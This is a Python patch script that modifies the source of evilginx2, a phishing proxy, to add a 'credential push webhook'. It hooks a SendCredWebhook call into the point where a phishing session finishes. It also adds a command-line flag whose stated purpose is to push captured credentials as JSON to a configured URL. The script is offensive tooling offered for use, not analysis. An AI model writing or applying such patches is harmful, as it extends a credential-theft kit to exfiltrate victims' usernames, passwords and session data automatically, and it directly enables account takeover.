#!/usr/bin/env python3
# patch_webhook.py — Pro-feature #12: credential push webhook. Run in ~/evilginx2-src.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit(f"[abort] {path}: pattern found {n}x (need exactly 1):\n{old[:140]}")
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print(f"[patch] {path} OK")

# 1) struct fields
patch("core/http_proxy.go",
      "\tjsobf             string\n",
      "\tjsobf             string\n"
      "\twebhook_url       string\n"
      "\twh_sent           map[string]bool\n"
      "\twh_mtx            sync.Mutex\n")

# 2) init
patch("core/http_proxy.go",
      "\tp.bg_grease = make(map[string]bool)\n",
      "\tp.bg_grease = make(map[string]bool)\n"
      "\tp.wh_sent = make(map[string]bool)\n")

# 3) fire once at session-done (before Finish)
patch("core/http_proxy.go",
      "\t\t\t\t\ts.Finish(false)\n",
      "\t\t\t\t\tgo p.SendCredWebhook(pl, s)\n"
      "\t\t\t\t\ts.Finish(false)\n")

# 4) main.go flag + setter
patch("main.go",
      'var jsobf_level = flag.String("jsobf", "off", "Obfuscate injected JS: off|low|medium|high|ultra")\n',
      'var jsobf_level = flag.String("jsobf", "off", "Obfuscate injected JS: off|low|medium|high|ultra")\n'
      'var webhook_url_flag = flag.String("webhook", "", "Push captured credentials (JSON) to this internal URL")\n')
patch("main.go",
      "\thp.SetJsObfuscation(*jsobf_level)\n",
      "\thp.SetJsObfuscation(*jsobf_level)\n"
      "\thp.SetWebhookUrl(*webhook_url_flag)\n")

print("[done] webhook patches applied")
